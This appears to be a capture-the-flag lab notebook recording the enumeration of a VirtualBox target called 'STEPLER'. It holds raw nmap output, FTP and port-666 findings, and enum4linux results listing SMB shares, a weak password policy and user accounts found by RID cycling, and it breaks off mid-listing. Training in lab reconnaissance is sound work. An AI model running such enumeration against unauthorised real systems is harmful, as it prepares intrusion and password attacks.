[*] STEPLER [*]

# Date : 26/01/2022

# ->Enumeration Phase:

# Nmap 7.91 scan initiated Wed Jan 26 12:08:19 2022 as: nmap -sC -sV -vv -p- -oN nmap_all 192.168.0.107
Nmap scan report for 192.168.0.107
Host is up, received arp-response (0.00087s latency).
Scanned at 2022-01-26 12:08:20 IST for 167s
Not shown: 65523 filtered ports
Reason: 65523 no-responses
PORT      STATE  SERVICE     REASON         VERSION
20/tcp    closed ftp-data    reset ttl 64
21/tcp    open   ftp         syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.0.106
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc/xrBbi5hixT2B19dQilbbrCaRllRyNhtJcOzE8x0BM1ow9I80RcU7DtajyqiXXEwHRavQdO+/cHZMyOiMFZG59OCuIouLRNoVO58C91gzDgDZ1fKH6BDg+FaSz+iYZbHg2lzaMPbRje6oqNamPR4QGISNUpxZeAsQTLIiPcRlb5agwurovTd3p0SXe0GknFhZwHHvAZWa2J6lHE2b9K5IsSsDzX2WHQ4vPb+1DzDHV0RTRVUGviFvUX1X5tVFvVZy0TTFc0minD75CYClxLrgc+wFLPcAmE2C030ER/Z+9umbhuhCnLkLN87hlzDSRDPwUjWr+sNA3+7vc/xuZul
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQB5n5kAZPIyHb9lVx1aU0fyOXMPUblpmB8DRjnP8tVIafLIWh54wmTFVd3nCMr1n5IRWiFeX1weTBDSjjz0IY=
|   256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ9wvrF4tkFMApswOmWKpTymFjkaiIoie4QD0RWOYnny
53/tcp    open   domain      syn-ack ttl 64 dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        syn-ack ttl 64 PHP cli server 5.5 or later
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
123/tcp   closed ntp         reset ttl 64
137/tcp   closed netbios-ns  reset ttl 64
138/tcp   closed netbios-dgm reset ttl 64
139/tcp   open   netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?       syn-ack ttl 64
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       syn-ack ttl 64 MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, Support41Auth, SupportsLoadDataLocal, ODBCClient, SupportsTransactions, FoundRows, LongPassword, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, SupportsCompression, DontAllowDatabaseTableColumn, LongColumnFlag, InteractiveClient, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: lu8=x,Safjz\x17uS\x0E9Aj\x1A\x08
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.91%I=7%D=1/26%Time=61F0ECD9%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:1C:BD:25 (Oracle VirtualBox virtual NIC)
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 5h30m00s, deviation: 0s, median: 5h29m59s
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36000/tcp): CLEAN (Timeout)
|   Check 2 (port 50829/tcp): CLEAN (Timeout)
|   Check 3 (port 33023/udp): CLEAN (Failed to receive data)
|   Check 4 (port 64559/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2022-01-26T12:10:37+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-26T12:10:37
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 26 12:11:07 2022 -- 1 IP address (1 host up) scanned in 168.42 seconds


>> in ftp 1 file found: note

Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.

>> during joinig ftp message is displayed:

Harry, make sure to update the banner when you get a chance to show who has access here 

>> a port 666 gives bad output after connecting it.so save output in zip file. 
>> and unizip it.it gives message2.txt file.

$echo hellow world
hellow world
$echo Scott, please change this message
segmentation fault

>> run enum4linux :

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan 26 18:16:19 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.0.107
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 192.168.0.107    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 192.168.0.107    |
 ============================================= 
Looking up status of 192.168.0.107
	RED             <00> -         H <ACTIVE>  Workstation Service
	RED             <03> -         H <ACTIVE>  Messenger Service
	RED             <20> -         H <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         H <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 192.168.0.107    |
 ====================================== 
[+] Server 192.168.0.107 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 192.168.0.107    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 192.168.0.107    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.0.107 from smbclient: 
[+] Got OS info for 192.168.0.107 from srvinfo:
	RED            Wk Sv PrQ Unx NT SNT red server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 192.168.0.107    |
 ============================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================== 
|    Share Enumeration on 192.168.0.107    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	kathy           Disk      Fred, What are we doing here?
	tmp             Disk      All temporary files should be stored here
	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.0.107
//192.168.0.107/print$	Mapping: DENIED, Listing: N/A
//192.168.0.107/kathy	Mapping: OK, Listing: OK
//192.168.0.107/tmp	Mapping: OK, Listing: OK
//192.168.0.107/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 192.168.0.107    |
 ===================================================== 


[+] Attaching to 192.168.0.107 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] RED
	[+] Builtin

[+] Password Info for Domain: RED

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================== 
|    Groups on 192.168.0.107    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 192.168.0.107 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-864226560-67800430-3082388513
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
[+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password ''
S-1-5-21-864226560-67800430-3082388513-500 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-501 RED\nobody (Local User)
S-1-5-21-864226560-67800430-3082388513-502 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-503 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-504 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-505 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-506 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-507 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-508 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-509 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-510 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-511 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-512 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)
S-1-5-21-864226560-67800430-3082388513-514 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-515 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-516 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-517 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-518 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-519 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-520 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-521 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-522 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-523 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-524 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-525 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-526 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-527 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-528 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-529 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-530 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-531 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-532 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-533 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-534 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-535 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-536 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-537 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-538 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-539 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-540 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-541 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-542 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-543 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-544 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-545 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-546 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-547 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-548 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-549 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-550 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1000 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1001 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1002 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1003 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1004 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1005 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1006 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1007 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1008 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1009 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1010 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1011 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1012 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1013 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1014 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1015 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1016 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1017 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1018 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1019 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1020 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1021 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1022 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1023 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1024 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1025 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1026 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1027 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1028 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1029 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1030 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1031 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1032 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1033 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1034 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1035 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-1036 *unknown*\*unknown* (8)
